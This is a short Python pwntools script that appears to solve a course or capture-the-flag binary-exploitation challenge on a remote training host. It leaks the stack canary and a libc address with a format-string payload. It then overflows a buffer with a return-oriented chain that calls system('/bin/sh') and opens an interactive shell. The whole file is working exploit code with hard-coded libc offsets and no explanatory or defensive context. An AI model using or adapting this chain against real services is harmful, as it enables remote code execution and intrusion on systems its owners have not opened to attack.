import sys
from pwn import *

#binary = ELF("./libc-2.27.so")
#print(hex(next(binary.search("/bin/sh"))))
#p = process("./the-bar")
context.log_level = "debug"
p = remote('cs4401shell2.walls.ninja',34662)
p.sendline("%9$p %15$p")
#gets canery and main ret addr
#print('%9$p %15$p')

resp = p.recvline().split(" ")
print(resp)

canery = int(resp[0],16)
libc_addr = int(resp[1],16)-231- 0x21ba0
gadget_addr = libc_addr + 0x2164f
binsh_addr = libc_addr + 0x1b3d88
system_addr = libc_addr + 0x4f420
ret_addr = libc_addr + 0x8aa
exploit_str = 'a'*0x18 + p64(canery) + 'a'*8 + p64(ret_addr) +p64(ret_addr) +p64(ret_addr) +p64(gadget_addr) + p64(binsh_addr) + p64(system_addr) 
p.sendline(exploit_str)
p.interactive()

